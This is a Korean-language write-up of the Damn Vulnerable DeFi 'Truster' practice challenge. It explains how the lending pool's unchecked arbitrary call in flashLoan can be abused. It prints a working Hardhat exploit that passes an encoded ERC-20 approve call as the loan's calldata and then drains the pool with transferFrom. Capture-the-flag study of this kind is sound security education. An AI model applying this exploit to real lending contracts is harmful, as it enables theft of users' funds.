https://teberr.notion.site/Damn-Vulnerable-Defi-Truster-d820a7d5422c4ff4afbb29b9eaacea38

# 문제 소개

![문제.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2aef8384-4675-4161-bed6-bcc58bae438c/%EB%AC%B8%EC%A0%9C.png)

문제 #3 - Truster

DVT토큰을 공짜로 빌려주는 대출 풀이 새롭게 런칭되었습니다. 현재 이 풀에는 1백만개의 DVT 토큰이 존재하고 공격자인 우리는 토큰이 없습니다. 하지만 풀에서 이 1백만개의 토큰을 탈취하면 그만!

# 코드 분석 및 공격 설계

## Truster.sol

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract TrusterLenderPool is ReentrancyGuard {

    using Address for address;
    IERC20 public immutable damnValuableToken;
    constructor (address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

}
```

TrusterLenderPool은 생성자와 flashLoan 함수로 이루어져 있다.

```solidity
    constructor (address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }
```

damnValuableToken은 IERC20 토큰임을 알 수 있다.

```solidity
function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
```

flashLoan 함수는 다음과 같은 과정을 거친다.

1. 이 컨트랙트의 대출 전 잔고(balanceBefore)가 빌려줄 양보다 많은지 확인한다.
2. borrower에게 빌려줄 양만큼 damnVvaluableToken을 보내준다.
3. target의 (data)함수를 호출한다.
4. 대출 상환 후 컨트랙트의 잔고가 대출전보다 크거나 같은지 확인한다.

여기서 의아한 부분은 3번으로 target 주소의 함수(data)를 호출하는 과정에서 이 컨트랙트가 어떤 컨트랙트인지 검증이 없다. 그렇다면 이 부분을 이용하여 우리가 원하는 컨트랙트에서 원하는 함수를 실행시켜서 돈을 빼낼 수는 없을지 생각해보자.

만약 토큰을 나(attacker)에게 전송시키는 함수를 실행시킨다면 4번 조건에 걸려서 불가능해진다. 따라서 나에게 바로 전송시키는 함수를 통해 돈을 빼낼 수는 없다. 그렇다면 다른 방법을 생각해봐야 한다.

damnValuableToken이 ERC-20 토큰임이 핵심이다. ERC-20 토큰의 경우 전송 권한을 위임하는 approve 함수가 존재하는데 이 함수를 이용해서 내가 원하는 양 만큼 가져올 수 있도록 권한을 위임받으면 그 양만큼 다음에 토큰을 빼내올 수가 있다. 

approve(권한 위임받을 주소 ,권한 위임 받을 양)의 형태로 approve(address,uint256)을 이용할 것이다. 문제에서 함수의 위치가 될 data를 바이트 형식으로 받도록 되어있는데 이 approve(addres,uint256)을 바이트 형태로 바꿔주어 damnValuableToken.approve(address,uint256)이 실행되도록 하자

바이트 형태로 넣어주기 위해서는 호출할 함수의 Signature + 각 인자들의 해시값을 구해 직접 바이트값을 넣어주어야 한다.

호출할 함수의 Signature(4바이트) + 각 인자들 이므로 Signature를 먼저 확인하자. 

호출할 함수의 Signature는 [https://sig.eth.samczsun.com/](https://sig.eth.samczsun.com/)에서 확인할 수 있다.

![approve(address,uint256).PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2da87797-c283-4512-913f-c8effda912fb/approve(addressuint256).png)

Signature의 경우 앞의 4바이트만 사용하므로 0x095ea7b3이 된다.

각 인자들은 이제 address와 uint256인데 이를 각각 64자리의 16진수 값(32바이트)으로 표현한 것으로 Signature 뒤에 덧붙이면 된다.

이 때 address는 기본적으로 40자리(20바이트)이기에 64자리로 만들어 주기 위해서는 0을 앞에 24개를 덧붙여야 한다. 

즉 address는 (‘000000000000000000000000’+attacker.address.slice(2))가 된다. address의 앞의 2자리를 자르는 이유는 이 값은 헥스를 의미하는 0x이므로 떼어내기 위함이다.

uint256 amount의 경우 내가 승인받아 빼낼 값이 1백만이다. 이 값이 ether단위인지 wei단위인지 확인하기 위해 test 폴더의 truster.challenge.js를 확인하면

![tokens.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2617d823-9d4a-410a-b244-a54e724ca635/tokens.png)

이더 단위로 백만임을 알 수 있다. 즉 1백만*10^18이므로 이를 hex로 바꿔주면

![amount.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d81d5de3-1ba3-4518-8e11-56a03206acfd/amount.png)

D3C21BCECCEDA1000000 가 된다. 이 또한 64자리(32바이트)로 맞춰서 0을 넣어주자. 

즉 data는 0x095ea7b3 + (’000000000000000000000000’+attacker.address.slice(2)) + ‘00000000000000000000000000000000000000000000D3C21BCECCEDA1000000’ 이 된다.

# 공격

```solidity
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});
```

즉 여기서 공격 코드는 this.pool의 flashLoan 함수를 호출하되 target이 damnValuableToken,data가 0x095ea7b3 + (’000000000000000000000000’+attacker.address.slice(2)) + ‘00000000000000000000000000000000000000000000D3C21BCECCEDA1000000’ 이면 된다.

```tsx
it('Exploit', async function () {
        await this.pool.flashLoan(
            0,
            attacker.address,
            this.token.address,
            '0x095ea7b3000000000000000000000000'+attacker.address.slice(2) + '00000000000000000000000000000000000000000000D3C21BCECCEDA1000000'
            )
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address ,TOKENS_IN_POOL)
 });
```

로 작성하여 flashLoan 함수를 이용해 

damnValuableToken.approve(attacker.address,1000000000000000000000000)을 실행시킨 후

damnValuableToken을 TrusterLenderPool에서 attacker의 주소로 1000000000000000000000000만큼 보내게 하면 된다.

![성공1.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/878f9d49-9771-4bd6-b794-0e955a0bdf5e/%EC%84%B1%EA%B3%B51.png)

npm run truster를 통해 공격이 성공했는지 테스트 결과를 확인해 보면 공격이 정상적으로 성공했음을 확인할 수 있다.
